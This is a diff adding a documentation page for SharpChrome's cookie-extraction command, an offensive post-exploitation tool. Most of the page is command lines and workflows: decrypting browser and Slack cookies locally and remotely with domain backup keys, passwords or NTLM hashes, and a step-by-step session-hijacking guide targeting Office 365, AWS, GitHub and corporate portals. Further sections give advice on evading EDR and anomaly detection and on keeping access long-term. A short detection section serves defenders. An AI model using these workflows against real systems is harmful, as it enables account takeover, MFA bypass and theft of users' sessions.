@@ -1,0 +1,744 @@
+---
+title: "SharpChrome Cookies"
+description: "Extract and decrypt browser cookies from Chrome, Edge, Brave, and Slack for session hijacking and persistence"
+icon: "cookie"
+---
+
+## Overview
+
+The **cookies** command searches for Chromium-based browser 'Cookies' files and decrypts cookie values stored in SQLite databases. This enables session hijacking by extracting authentication cookies that can be imported into another browser to impersonate users without requiring passwords.
+
+SharpChrome's lockless SQLite implementation allows cookie extraction while the target browser is still running, making it ideal for stealthy credential harvesting operations. The command supports filtering by cookie name or URL using regex patterns, and can output in multiple formats including JSON for easy import.
+
+### Key Features
+
+- Extracts encrypted cookies from Chromium browsers
+- Supports session hijacking via cookie import
+- Regex filtering by cookie name and URL
+- JSON export compatible with EditThisCookie extension
+- Lockless database access (browser stays open)
+- Filters expired cookies automatically
+- Chrome 80+ AES state key support
+- Remote cookie extraction capability
+
+## Basic Usage
+
+<CodeGroup>
+
+```bash Unprivileged Context
+# Decrypt all cookies for current user
+SharpChrome.exe cookies
+
+# Decrypt cookies from Edge browser
+SharpChrome.exe cookies /browser:edge
+
+# Decrypt cookies from Brave browser
+SharpChrome.exe cookies /browser:brave
+```
+
+```bash With Domain DPAPI Backup Key
+# Use domain backup key to decrypt all users' cookies
+SharpChrome.exe cookies /pvk:HvG1sAAAAAABAAAAAAAAAAAAAACU...
+
+# Use backup key file
+SharpChrome.exe cookies /pvk:key.pvk
+```
+
+```bash With Filtering
+# Extract only cookies matching specific name pattern
+SharpChrome.exe cookies /cookie:"session.*"
+
+# Extract cookies from specific domain
+SharpChrome.exe cookies /url:".*github\.com.*"
+
+# Combine filters for targeted extraction
+SharpChrome.exe cookies /cookie:"auth_token" /url:".*company\.com.*"
+```
+
+```bash JSON Export for Import
+# Export cookies in EditThisCookie JSON format
+SharpChrome.exe cookies /format:json /url:".*office\.com.*"
+
+# Export with extended expiration
+SharpChrome.exe cookies /format:json /setneverexpire /url:".*portal.*"
+```
+
+</CodeGroup>
+
+## Command Arguments
+
+<Tabs>
+  <Tab title="Decryption">
+    ### Decryption Arguments
+
+    <ParamField path="/unprotect" type="flag">
+      Force use of CryptUnprotectData() for decryption. Default behavior in unprivileged contexts. Must be run from the user context that saved the cookies.
+    </ParamField>
+
+    <ParamField path="/pvk" type="string">
+      Use a DPAPI domain backup key to decrypt user masterkeys, then decrypt cookies.
+
+      Accepts two formats:
+      - Base64-encoded key: `/pvk:HvG1sAAAAAABAAAAAAAAAAAAAAACU...`
+      - File path: `/pvk:key.pvk`
+
+      Requires domain admin rights to obtain the backup key via the `backupkey` command.
+    </ParamField>
+
+    <ParamField path="{GUID}:SHA1" type="string">
+      One or more DPAPI masterkey GUID:SHA1 mappings for decryption.
+
+      ```bash
+      SharpChrome.exe cookies {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd...
+      ```
+
+      Extract these with Mimikatz: `sekurlsa::dpapi`
+    </ParamField>
+
+    <ParamField path="/mkfile" type="file">
+      File containing one or more GUID:SHA1 masterkey mappings (one per line).
+
+      ```bash
+      SharpChrome.exe cookies /mkfile:masterkeys.txt
+      ```
+    </ParamField>
+
+    <ParamField path="/password" type="string">
+      Decrypt target user's masterkeys using plaintext password. Works remotely.
+
+      ```bash
+      SharpChrome.exe cookies /password:Password123!
+      ```
+    </ParamField>
+
+    <ParamField path="/ntlm" type="string">
+      Decrypt target user's masterkeys using NTLM hash. Works remotely.
+
+      ```bash
+      SharpChrome.exe cookies /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+      ```
+    </ParamField>
+
+    <ParamField path="/prekey" type="string">
+      Decrypt target user's masterkeys using DPAPI prekey (domain or local SHA1).
+
+      - Domain users: Use `dpapi` field from Mimikatz `sekurlsa::msv`
+      - Local users: Use `sha1` field from Mimikatz `sekurlsa::msv`
+    </ParamField>
+
+    <ParamField path="/rpc" type="flag">
+      Decrypt target user's masterkeys by asking the domain controller via RPC.
+    </ParamField>
+
+    <ParamField path="/statekey" type="string">
+      Provide a pre-decrypted AES state key for Chrome 80+ cookie decryption.
+
+      ```bash
+      SharpChrome.exe cookies /statekey:3F7A8B2C9D1E4F6A8B2C9D1E4F6A8B2C
+      ```
+
+      Obtain using the `statekeys` command first.
+    </ParamField>
+  </Tab>
+
+  <Tab title="Targeting">
+    ### Targeting Arguments
+
+    <ParamField path="/target" type="path">
+      Specify a specific Cookies file or user directory to target.
+
+      **File targeting:**
+      ```bash
+      SharpChrome.exe cookies /target:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Cookies"
+      ```
+
+      **User directory targeting:**
+      ```bash
+      SharpChrome.exe cookies /target:C:\Users\targetuser\
+      ```
+    </ParamField>
+
+    <ParamField path="/server" type="string">
+      Triage a remote server. Must be combined with `/pvk` or `/password`.
+
+      ```bash
+      SharpChrome.exe cookies /server:WORKSTATION01 /pvk:key.pvk
+      ```
+
+      Requires administrative access to the remote system.
+    </ParamField>
+
+    <ParamField path="/browser" type="string">
+      Specify which Chromium-based browser to target.
+
+      Supported values:
+      - `chrome` (default) - Google Chrome
+      - `edge` - Chromium-based Microsoft Edge
+      - `brave` - Brave Browser
+      - `slack` - Slack Desktop App
+
+      ```bash
+      SharpChrome.exe cookies /browser:edge
+      ```
+    </ParamField>
+  </Tab>
+
+  <Tab title="Output">
+    ### Output Arguments
+
+    <ParamField path="/format" type="string">
+      Specify the output format for cookie display.
+
+      Available formats:
+      - `csv` (default) - Comma-separated values
+      - `table` - Formatted table display
+      - `json` - EditThisCookie import format
+
+      ```bash
+      SharpChrome.exe cookies /format:json
+      ```
+
+      The `json` format is specifically designed for import into the [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en) browser extension.
+    </ParamField>
+
+    <ParamField path="/showall" type="flag">
+      Display ALL cookie entries including expired cookies. By default, only non-expired cookies are shown.
+
+      ```bash
+      SharpChrome.exe cookies /showall
+      ```
+    </ParamField>
+
+    <ParamField path="/setneverexpire" type="flag">
+      Set cookie expiration dates to now + 100 years in JSON output. Useful for preventing imported cookies from expiring.
+
+      ```bash
+      SharpChrome.exe cookies /format:json /setneverexpire
+      ```
+
+      Only applies when `/format:json` is used.
+    </ParamField>
+
+    <ParamField path="/consoleoutfile" type="file">
+      Redirect all console output to a file on disk.
+
+      ```bash
+      SharpChrome.exe cookies /consoleoutfile:C:\Temp\cookies.txt
+      ```
+    </ParamField>
+  </Tab>
+
+  <Tab title="Filtering">
+    ### Filtering Arguments
+
+    <ParamField path="/cookie" type="regex">
+      Only return cookies where the cookie name matches the supplied regex pattern.
+
+      ```bash
+      # Extract session cookies
+      SharpChrome.exe cookies /cookie:"session.*"
+
+      # Extract authentication tokens
+      SharpChrome.exe cookies /cookie:".*token.*"
+
+      # Extract specific cookie
+      SharpChrome.exe cookies /cookie:"^auth_key$"
+      ```
+
+      Extremely useful for targeted session hijacking.
+    </ParamField>
+
+    <ParamField path="/url" type="regex">
+      Only return cookies where the URL/domain matches the supplied regex pattern.
+
+      ```bash
+      # Extract cookies from specific domain
+      SharpChrome.exe cookies /url:".*github\.com.*"
+
+      # Extract cookies from company portal
+      SharpChrome.exe cookies /url:".*portal\.company\.com.*"
+
+      # Extract cookies from multiple domains
+      SharpChrome.exe cookies /url:".*(github|gitlab)\.com.*"
+      ```
+
+      Combine with `/format:json` for easy site-specific session cloning.
+    </ParamField>
+
+    ### Default Filtering Behavior
+
+    By default, the cookies command:
+    - Shows only non-expired cookies (use `/showall` to include expired)
+    - Processes all users when elevated, current user only when unprivileged
+    - Returns all cookies without filtering (use `/cookie` or `/url` to filter)
+  </Tab>
+</Tabs>
+
+## Chrome 80+ State Key Encryption
+
+Starting with Chrome 80, cookies use AES encryption via a state key instead of direct DPAPI encryption.
+
+### State Key Process
+
+1. **State Key Storage**: AES key stored in `Local State` file
+2. **DPAPI Protection**: State key encrypted with DPAPI
+3. **Cookie Encryption**: Cookies encrypted with AES state key
+
+### Automatic Handling
+
+SharpChrome automatically handles Chrome 80+ encryption:
+
+```bash
+# Automatically decrypts state key and uses it
+SharpChrome.exe cookies /pvk:key.pvk
+```
+
+### Manual State Key Usage
+
+For better control, extract state keys separately:
+
+```bash
+# Step 1: Extract state keys
+SharpChrome.exe statekeys /pvk:key.pvk
+
+# Step 2: Use state key for cookie decryption
+SharpChrome.exe cookies /statekey:EXTRACTED_KEY_HERE
+```
+
+## Supported Browsers
+
+<CardGroup cols={2}>
+  <Card title="Google Chrome" icon="chrome">
+    Default target. Extracts cookies from all Chrome profiles.
+
+    **Location**: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`
+  </Card>
+
+  <Card title="Microsoft Edge" icon="edge">
+    Chromium-based Edge. Use `/browser:edge`.
+
+    **Location**: `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies`
+  </Card>
+
+  <Card title="Brave Browser" icon="shield">
+    Privacy-focused browser. Use `/browser:brave`.
+
+    **Location**: `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Cookies`
+  </Card>
+
+  <Card title="Slack Desktop" icon="slack">
+    Slack desktop app. Use `/browser:slack`.
+
+    **Location**: `%APPDATA%\Slack\Cookies`
+  </Card>
+</CardGroup>
+
+## Cookie Hijacking Guide
+
+### What is Cookie Hijacking?
+
+Cookie hijacking involves stealing authenticated session cookies from a target user and importing them into your browser. This bypasses the need for passwords and multi-factor authentication in many cases, as the session is already established.
+
+### Step-by-Step Workflow
+
+<Steps>
+  <Step title="Extract Cookies">
+    Extract cookies from the target system in JSON format:
+
+    ```bash
+    # Extract all cookies from Office 365
+    SharpChrome.exe cookies /format:json /url:".*office\.com.*" /setneverexpire
+
+    # Extract cookies from GitHub
+    SharpChrome.exe cookies /format:json /url:".*github\.com.*" /setneverexpire
+
+    # Save to file
+    SharpChrome.exe cookies /format:json /url:".*portal.*" /consoleoutfile:cookies.json
+    ```
+  </Step>
+
+  <Step title="Install EditThisCookie">
+    Install the [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en) extension in your Chrome browser.
+
+    This extension allows easy cookie import/export and is compatible with SharpChrome's JSON output.
+  </Step>
+
+  <Step title="Import Cookies">
+    In your browser:
+    1. Navigate to the target domain (e.g., portal.office.com)
+    2. Click the EditThisCookie extension icon
+    3. Click the import icon (upload symbol)
+    4. Paste the JSON output from SharpChrome
+    5. Click "Import" to load the cookies
+  </Step>
+
+  <Step title="Access the Session">
+    Refresh the page. You should now be authenticated as the target user without entering credentials.
+
+    **Important**: The session remains active as long as:
+    - The cookies haven't expired (use `/setneverexpire`)
+    - The target user hasn't logged out
+    - The service doesn't detect anomalies (different IP, user-agent, etc.)
+  </Step>
+</Steps>
+
+### High-Value Cookie Targets
+
+<CardGroup cols={2}>
+  <Card title="Office 365 / Azure" icon="microsoft">
+    ```bash
+    SharpChrome.exe cookies /format:json /url:".*(office|azure|microsoft)\.com.*" /setneverexpire
+    ```
+    Access email, OneDrive, Teams, and Azure portal
+  </Card>
+
+  <Card title="AWS Console" icon="aws">
+    ```bash
+    SharpChrome.exe cookies /format:json /url:".*aws\.amazon\.com.*" /setneverexpire
+    ```
+    Access AWS console with user's permissions
+  </Card>
+
+  <Card title="GitHub / GitLab" icon="github">
+    ```bash
+    SharpChrome.exe cookies /format:json /url:".*(github|gitlab)\.com.*" /setneverexpire
+    ```
+    Access repositories and code with user's access
+  </Card>
+
+  <Card title="Corporate VPN / Portal" icon="shield">
+    ```bash
+    SharpChrome.exe cookies /format:json /url:".*portal\.company\.com.*" /setneverexpire
+    ```
+    Access internal company resources
+  </Card>
+</CardGroup>
+
+### Session Persistence Strategies
+
+<Tip>
+**Maintaining Long-Term Access:**
+
+1. Use `/setneverexpire` to extend cookie lifetimes
+2. Extract cookies periodically to refresh sessions
+3. Use cookies before the user logs out
+4. Consider exfiltrating both cookies and credentials
+5. Monitor for session invalidation events
+</Tip>
+
+## Example Workflows
+
+### Scenario 1: Basic Cookie Extraction
+
+Extract all cookies for the current user:
+
+```bash
+# CSV format (default)
+SharpChrome.exe cookies
+
+# Table format for readability
+SharpChrome.exe cookies /format:table
+
+# Include expired cookies
+SharpChrome.exe cookies /showall
+```
+
+### Scenario 2: Targeted Session Hijacking
+
+Extract specific cookies for session hijacking:
+
+```bash
+# Step 1: Extract Office 365 cookies in JSON format
+SharpChrome.exe cookies /format:json /url:".*office\.com.*" /setneverexpire /consoleoutfile:o365.json
+
+# Step 2: Import into EditThisCookie
+# (Copy JSON from o365.json and import via extension)
+
+# Step 3: Navigate to https://portal.office.com
+# You're now logged in as the target user
+```
+
+### Scenario 3: Domain-Wide Cookie Harvesting
+
+As domain admin, harvest cookies from all domain workstations:
+
+```bash
+# Step 1: Get domain backup key
+SharpChrome.exe backupkey /server:DC01 /file:backup.pvk
+
+# Step 2: Extract cookies from local machine (all users)
+SharpChrome.exe cookies /pvk:backup.pvk /format:json /url:".*company\.com.*" /consoleoutfile:local_cookies.json
+
+# Step 3: Extract from remote workstations
+SharpChrome.exe cookies /server:WORKSTATION01 /pvk:backup.pvk /format:json /url:".*company\.com.*" /consoleoutfile:wks01_cookies.json
+SharpChrome.exe cookies /server:WORKSTATION02 /pvk:backup.pvk /format:json /url:".*company\.com.*" /consoleoutfile:wks02_cookies.json
+```
+
+### Scenario 4: Filtered Cookie Extraction
+
+Extract specific cookies using regex patterns:
+
+```bash
+# Extract only session cookies
+SharpChrome.exe cookies /cookie:"session.*" /format:json
+
+# Extract authentication tokens
+SharpChrome.exe cookies /cookie:".*token.*" /url:".*api\..*"
+
+# Extract cookies from multiple cloud providers
+SharpChrome.exe cookies /url:".*(aws|azure|gcp).*" /format:json /setneverexpire
+```
+
+### Scenario 5: Remote Cookie Extraction
+
+Extract cookies from remote systems:
+
+```bash
+# Using password authentication
+SharpChrome.exe cookies /server:WORKSTATION03 /password:Password123! /format:json /url:".*"
+
+# Using NTLM hash
+SharpChrome.exe cookies /server:WORKSTATION03 /ntlm:8846F7EAEE8FB117AD06BDD830B7586C /format:json
+
+# Using domain backup key
+SharpChrome.exe cookies /server:WORKSTATION03 /pvk:backup.pvk /format:json
+```
+
+### Scenario 6: Multi-Browser Cookie Extraction
+
+Extract cookies from all Chromium-based browsers:
+
+```bash
+# Chrome
+SharpChrome.exe cookies /pvk:backup.pvk /format:json /consoleoutfile:chrome_cookies.json
+
+# Edge
+SharpChrome.exe cookies /browser:edge /pvk:backup.pvk /format:json /consoleoutfile:edge_cookies.json
+
+# Brave
+SharpChrome.exe cookies /browser:brave /pvk:backup.pvk /format:json /consoleoutfile:brave_cookies.json
+
+# Slack
+SharpChrome.exe cookies /browser:slack /pvk:backup.pvk /format:json /consoleoutfile:slack_cookies.json
+```
+
+## Example Output
+
+### CSV Format (Default)
+
+```csv
+Host,Name,Value,Path,Expires,Secure,HttpOnly
+.github.com,_gh_sess,QnBfvL5kNxZp7vK9%2B...,/,2024-12-31 23:59:59,True,True
+.office.com,.AspNet.Cookies,CfDJ8Abc123...,/,2024-12-31 23:59:59,True,True
+.aws.amazon.com,aws-userInfo,eyJhbGciOiJIUzI1...,/,2024-12-31 23:59:59,True,False
+```
+
+### Table Format
+
+```
+┌────────────────────┬───────────────────┬─────────────────────────┬────────┬─────────────────────┬────────┬──────────┐
+│ Host               │ Name              │ Value                   │ Path   │ Expires             │ Secure │ HttpOnly │
+├────────────────────┼───────────────────┼─────────────────────────┼────────┼─────────────────────┼────────┼──────────┤
+│ .github.com        │ _gh_sess          │ QnBfvL5kNxZp7vK9%2B...  │ /      │ 2024-12-31 23:59:59 │ True   │ True     │
+│ .office.com        │ .AspNet.Cookies   │ CfDJ8Abc123...          │ /      │ 2024-12-31 23:59:59 │ True   │ True     │
+│ .aws.amazon.com    │ aws-userInfo      │ eyJhbGciOiJIUzI1...     │ /      │ 2024-12-31 23:59:59 │ True   │ False    │
+└────────────────────┴───────────────────┴─────────────────────────┴────────┴─────────────────────┴────────┴──────────┘
+```
+
+### JSON Format (EditThisCookie Compatible)
+
+```json
+[
+  {
+    "domain": ".github.com",
+    "expirationDate": 1735689599,
+    "hostOnly": false,
+    "httpOnly": true,
+    "name": "_gh_sess",
+    "path": "/",
+    "sameSite": "no_restriction",
+    "secure": true,
+    "session": false,
+    "storeId": "0",
+    "value": "QnBfvL5kNxZp7vK9%2B..."
+  },
+  {
+    "domain": ".office.com",
+    "expirationDate": 1735689599,
+    "hostOnly": false,
+    "httpOnly": true,
+    "name": ".AspNet.Cookies",
+    "path": "/",
+    "sameSite": "no_restriction",
+    "secure": true,
+    "session": false,
+    "storeId": "0",
+    "value": "CfDJ8Abc123..."
+  }
+]
+```
+
+## Detection Considerations
+
+### EDR/AV Detection Vectors
+
+1. **Process Activity**
+   - SharpChrome.exe accessing Cookies SQLite databases
+   - Mass cookie file enumeration across user profiles
+   - Unusual SQLite database operations
+
+2. **File Access Patterns**
+   - Reading Cookies files from multiple user profiles
+   - Accessing Local State files for state keys
+   - Lockless database access to open Cookies files
+
+3. **Network Activity**
+   - Remote file access to UNC paths for cookie databases
+   - SMB connections to multiple workstations
+   - Bulk cookie exfiltration over network
+
+4. **Behavioral Indicators**
+   - Rapid enumeration of browser profile directories
+   - Simultaneous access to multiple browsers' cookie stores
+   - Cookie export to JSON files
+
+### OPSEC Recommendations
+
+<Warning>
+**Defensive Awareness Points:**
+
+- Cookie extraction is highly detectable if EDR monitors file access
+- Remote extraction generates SMB traffic to Admin$ shares
+- JSON export creates suspicious file artifacts
+- Session hijacking may trigger anomaly detection (IP changes, geolocation)
+- Use targeted filtering to minimize noise
+- Exfiltrate only necessary cookies, not full databases
+- Consider timing attacks during normal business hours
+</Warning>
+
+### Anomaly Detection
+
+Many enterprise applications detect session anomalies:
+
+- **IP Address Changes**: Session used from different location
+- **User-Agent Strings**: Different browser/OS detected
+- **Geolocation**: Login from impossible travel location
+- **Device Fingerprinting**: Device characteristics don't match
+- **Behavioral Analytics**: Usage patterns differ from normal
+
+<Tip>
+**Reducing Anomaly Detection:**
+
+1. Use cookies from the same network/IP range
+2. Match user-agent strings to the target's browser
+3. Use VPN/proxy matching target's location
+4. Time usage during target's normal active hours
+5. Mimic target's typical behavior patterns
+</Tip>
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="SharpChrome Logins" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-logins">
+    Extract saved login credentials from browsers
+  </Card>
+
+  <Card title="SharpChrome State Keys" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-statekeys">
+    Extract AES state keys for Chrome 80+ decryption
+  </Card>
+
+  <Card title="Backup Key Retrieval" icon="server" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain DPAPI backup key from DC
+  </Card>
+
+  <Card title="SharpChrome Overview" icon="chrome" href="/ghostpack-docs/SharpDPAPI-mdx/sharpchrome-overview">
+    Complete SharpChrome documentation
+  </Card>
+</CardGroup>
+
+## Tips and Troubleshooting
+
+### Common Issues
+
+<AccordionGroup>
+  <Accordion title="No cookies extracted">
+    **Possible causes:**
+    - Browser hasn't saved any cookies
+    - Running as wrong user (cookies are user-specific)
+    - All cookies are expired (default filters them out)
+    - Chrome 80+ requires state key
+
+    **Solutions:**
+    - Verify Cookies file exists and contains data
+    - Run as the user who owns the cookies
+    - Use `/showall` to include expired cookies
+    - Extract and use state key for Chrome 80+
+  </Accordion>
+
+  <Accordion title="Cookies decrypted but can't login">
+    **Possible causes:**
+    - Cookies expired before use
+    - Service detects session anomalies
+    - Additional security tokens required
+    - Session invalidated by original user
+
+    **Solutions:**
+    - Use `/setneverexpire` when exporting
+    - Extract fresh cookies just before use
+    - Match IP/user-agent to avoid detection
+    - Check if MFA or device trust is required
+  </Accordion>
+
+  <Accordion title="JSON import fails in browser">
+    **Possible causes:**
+    - JSON format malformed
+    - Wrong domain for cookie import
+    - Browser extension not installed
+
+    **Solutions:**
+    - Validate JSON syntax
+    - Navigate to correct domain first
+    - Install EditThisCookie extension
+    - Try importing cookies one at a time
+  </Accordion>
+
+  <Accordion title="Remote extraction fails">
+    **Possible causes:**
+    - No administrative access to remote system
+    - Firewall blocking SMB
+    - Missing decryption method
+
+    **Solutions:**
+    - Verify local admin rights on target
+    - Check SMB (port 445) connectivity
+    - Always use `/pvk` or `/password` with `/server`
+  </Accordion>
+</AccordionGroup>
+
+### Best Practices
+
+<Tip>
+**Operational Best Practices:**
+
+1. **Targeted Extraction**: Use regex filters to extract only needed cookies
+2. **JSON Export**: Always use `/format:json` with `/setneverexpire` for hijacking
+3. **Fresh Cookies**: Extract cookies as close to usage time as possible
+4. **Stealth**: Avoid mass extraction; target specific users/sites
+5. **Logging**: Use `/consoleoutfile` to save output for later analysis
+6. **Backup Keys**: Use domain backup key for maximum coverage
+7. **Testing**: Test cookie import in isolated environment first
+</Tip>
+
+### Performance Notes
+
+- **Local extraction**: Completes in seconds
+- **Remote extraction**: Depends on network speed and user count
+- **Lockless access**: Browser remains functional during extraction
+- **Large cookie databases**: May take longer to process and filter
+
+### Additional Resources
+
+- [EditThisCookie Extension](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en)
+- [Cookie Hijacking Techniques](https://owasp.org/www-community/attacks/Session_hijacking_attack)
+- [Chromium Cookie Storage](https://www.chromium.org/developers/design-documents/network-stack/cookiemonster)
+- [DPAPI Cookie Protection](https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)
